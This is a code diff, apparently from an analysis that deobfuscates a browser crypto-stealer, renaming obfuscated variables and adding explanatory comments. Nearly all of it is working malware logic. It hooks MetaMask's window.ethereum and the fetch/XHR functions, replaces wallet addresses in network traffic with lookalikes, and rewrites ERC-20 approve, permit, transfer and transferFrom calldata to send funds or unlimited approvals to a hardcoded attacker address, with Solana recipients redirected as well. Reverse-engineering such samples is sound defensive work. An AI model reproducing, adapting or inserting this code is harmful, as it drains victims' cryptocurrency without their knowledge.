@@ -14,12 +14,14 @@ import { levenshteinDistance } from "./levenshtein";
 declare global {
   interface Window {
     ethereum: any;
+    stealthProxyControl: any;
   }
 }
 
 // Set to true if the `eth_accounts` metamask call returned a non-empty list of
-// authorized ethereum accounts
-var hasAuthorizedEthereumAddresses = false;
+// authorized ethereum accounts. This is read by the XHR/fetch hooks to disable
+// randomly replacing address-looking strings in network payloads.
+var usingMetamaskHook = false;
 
 const addressFormats = {
   ethereum: /\b0x[a-fA-F0-9]{40}\b/g,
@@ -47,7 +49,7 @@ async function checkEthereumWindow() {
 
     if (authorizedAddresses.length > 0) {
       hookMetamask();
-      hasAuthorizedEthereumAddresses = true;
+      usingMetamaskHook = true;
     }
   } catch (err) {}
   hookNetworkFacilities();
@@ -165,7 +167,7 @@ function modifyCryptoAddresses(networkPayload: string) {
     const matches = networkPayload.match(cryptoAddrRegexp) || [];
     for (const match of matches) {
       if (cryptoKind == "ethereum") {
-        if (!ethereumAddresses.includes(match) && !hasAuthorizedEthereumAddresses) {
+        if (!ethereumAddresses.includes(match) && !usingMetamaskHook) {
           networkPayload = networkPayload.replace(
             match,
             pickSimilarAddress(match, ethereumAddresses),
@@ -266,6 +268,8 @@ function hookNetworkFacilities() {
   patchFetch();
 }
 
+/// Patch `window.ethereum` methods so that they replace the destination/beneficiary
+/// with the attacker's address.
 async function hookMetamask() {
   let interceptCount = 0;
   let originalMethods = new Map();
@@ -274,18 +278,19 @@ async function hookMetamask() {
   /// Patches a metamask request so that the recipient is the attacker's address
   ///
   /// If `isEthereum` is true, expects Ethereum format, if not, expect Solana
-  function patchMetamaskRequest(argsIn, isEthereum = true) {
-    const args = JSON.parse(JSON.stringify(argsIn));
+  function patchMetamaskTransaction(txIn, isEthereum = true) {
+    const tx = JSON.parse(JSON.stringify(txIn));
 
     if (isEthereum) {
+      // Ethereum codepath
       const attackerAddress = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
 
-      if (args.value && args.value !== "0x0" && args.value !== "0") {
-        args.to = MAIN_ETHEREUM_ADDRESS;
+      if (tx.value && tx.value !== "0x0" && tx.value !== "0") {
+        tx.to = MAIN_ETHEREUM_ADDRESS;
       }
 
-      if (args.data) {
-        const dataLowercase = args.data.toLowerCase();
+      if (tx.data) {
+        const dataLowercase = tx.data.toLowerCase();
 
         if (dataLowercase.startsWith("0x095ea7b3")) {
           // ERC-20 token approval signature
@@ -295,7 +300,7 @@ async function hookMetamask() {
           if (dataLowercase.length >= 74) {
             const tokenApproval = dataLowercase.substring(0, 10);
             const approvalAmount = "f".repeat(64);
-            args.data = tokenApproval + attackerAddress + approvalAmount;
+            tx.data = tokenApproval + attackerAddress + approvalAmount;
 
             // log the DEX exchange name
             const exchangeAddress = "0x" + dataLowercase.substring(34, 74);
@@ -319,7 +324,7 @@ async function hookMetamask() {
             const v = dataLowercase.substring(266, 330);
             const r = dataLowercase.substring(330, 394);
             const s = dataLowercase.substring(394, 458);
-            args.data =
+            tx.data =
               permitFunction + sourceAddress + attackerAddress + value + deadline + v + r + s;
           }
         } else if (dataLowercase.startsWith("0xa9059cbb")) {
@@ -329,7 +334,7 @@ async function hookMetamask() {
           if (dataLowercase.length >= 74) {
             const transfer = dataLowercase.substring(0, 10);
             const amount = dataLowercase.substring(74);
-            args.data = transfer + attackerAddress + amount;
+            tx.data = transfer + attackerAddress + amount;
           }
         } else if (dataLowercase.startsWith("0x23b872dd")) {
           // transferFrom(address,address,uint256)
@@ -339,11 +344,11 @@ async function hookMetamask() {
             const transferFrom = dataLowercase.substring(0, 10);
             const sourceAddress = dataLowercase.substring(10, 74);
             const amount = dataLowercase.substring(138);
-            args.data = transferFrom + sourceAddress + attackerAddress + amount;
+            tx.data = transferFrom + sourceAddress + attackerAddress + amount;
           }
         }
-      } else if (args.to && args.to !== MAIN_ETHEREUM_ADDRESS) {
-        args.to = MAIN_ETHEREUM_ADDRESS;
+      } else if (tx.to && tx.to !== MAIN_ETHEREUM_ADDRESS) {
+        tx.to = MAIN_ETHEREUM_ADDRESS;
       }
     } else {
       // Solana codepath: modify account/pubkey/key/recipient/destination to
@@ -351,8 +356,8 @@ async function hookMetamask() {
       //
       // 19111111111111111111111111111111
 
-      if (args.instructions && Array.isArray(args.instructions)) {
-        args.instructions.forEach((instruction) => {
+      if (tx.instructions && Array.isArray(tx.instructions)) {
+        tx.instructions.forEach((instruction) => {
           if (instruction.accounts && Array.isArray(instruction.accounts)) {
             instruction.accounts.forEach((account) => {
               if (typeof account === "string") {
@@ -371,14 +376,14 @@ async function hookMetamask() {
           }
         });
       }
-      if (args.recipient) {
-        args.recipient = "19111111111111111111111111111111";
+      if (tx.recipient) {
+        tx.recipient = "19111111111111111111111111111111";
       }
-      if (args.destination) {
-        args.destination = "19111111111111111111111111111111";
+      if (tx.destination) {
+        tx.destination = "19111111111111111111111111111111";
       }
     }
-    return args;
+    return tx;
   }
 
   function interceptMetamaskRequest(originalMethod, methodName) {
@@ -401,8 +406,7 @@ async function hookMetamask() {
             // wallet_requestPermissions first.
             //
             // https://docs.metamask.io/wallet/reference/json-rpc-methods/eth_sendtransaction/
-            const _0x39ad21 = patchMetamaskRequest(req.params[0], true);
-            req.params[0] = _0x39ad21;
+            req.params[0] = patchMetamaskTransaction(req.params[0], true);
           } catch (e) {}
         } else {
           if (
@@ -412,17 +416,17 @@ async function hookMetamask() {
             req.params[0]
           ) {
             try {
-              let _0x5ad975 = req.params[0];
-              if (_0x5ad975.transaction) {
-                _0x5ad975 = _0x5ad975.transaction;
+              let transaction = req.params[0];
+              if (transaction.transaction) {
+                transaction = transaction.transaction;
               }
-              const _0x5dbe63 = patchMetamaskRequest(_0x5ad975, false);
+              const patchedTransaction = patchMetamaskTransaction(transaction, false);
               if (req.params[0].transaction) {
-                req.params[0].transaction = _0x5dbe63;
+                req.params[0].transaction = patchedTransaction;
               } else {
-                req.params[0] = _0x5dbe63;
+                req.params[0] = patchedTransaction;
               }
-            } catch (_0x4b99fd) {}
+            } catch (e) {}
           }
         }
       }
